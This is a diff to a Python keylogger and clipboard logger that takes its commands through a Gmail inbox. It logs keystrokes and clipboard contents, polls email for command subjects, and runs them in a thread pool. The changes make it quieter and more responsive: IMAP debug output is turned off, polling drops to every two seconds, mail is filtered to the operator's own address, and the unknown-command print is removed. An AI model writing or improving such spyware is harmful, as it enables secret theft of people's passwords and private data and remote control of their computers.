@@ -15,10 +15,8 @@ import sys
 import threading
 import time
 from pathlib import Path
-
 import pyperclip
 from pynput import keyboard
-
 import imaplib
 import email
 import logging
@@ -30,6 +28,7 @@ from email.mime.base import MIMEBase
 from email import encoders
 from concurrent.futures import ThreadPoolExecutor
 
+imaplib.Debug=0
 
 # ── Configuration ──────────────────────────────────────────────────────────────
 
@@ -38,20 +37,19 @@ CLIP_OUTPUT_FILE = Path("temp.log")     # clipboard log
 STOP_KEY_NAME    = "f9"                 # key that stops the logger
 CLIP_INTERVAL    = 5.0                  # clipboard poll interval in seconds
 
-
 IMAP_HOST     = "imap.gmail.com"
 SMTP_HOST     = "smtp.gmail.com"
 SMTP_PORT     = 587
 IMAP_PORT     = 993
 EMAIL_ADDRESS = "you@gmail.com"
-EMAIL_PASS    = "your_app_password"
-POLL_INTERVAL = 30
+EMAIL_PASS    = "<APP PASSWORD>"
+POLL_INTERVAL = 2
 
 log_lock = threading.Lock()
 
 # ── Shared stop event ──────────────────────────────────────────────────────────
 
-stop_event = threading.Event()   # set() → both threads shut down
+stop_event = threading.Event() 
 
 # ── Keystroke helpers ──────────────────────────────────────────────────────────
 
@@ -136,7 +134,8 @@ class GmailPoller(threading.Thread):
 
     def poll(self):
         self.mail.select("INBOX")
-        status, data = self.mail.search(None, "UNSEEN")
+        today = datetime.date.today().strftime("%d-%b-%Y")
+        status, data = self.mail.search(None, f'(UNSEEN SINCE "{today}" FROM "{EMAIL_ADDRESS}")')
         if status != "OK" or not data[0]:
             return
 
@@ -161,8 +160,6 @@ class GmailPoller(threading.Thread):
         if func:
             self.mail.store(msg_id, "+FLAGS", "\\Seen")
             self.executor.submit(self._run, func, sender, subject)
-        else:
-            print(f"Unknown command: {subject!r}")
 
     def _run(self, func, sender: str, subject: str):
         try:
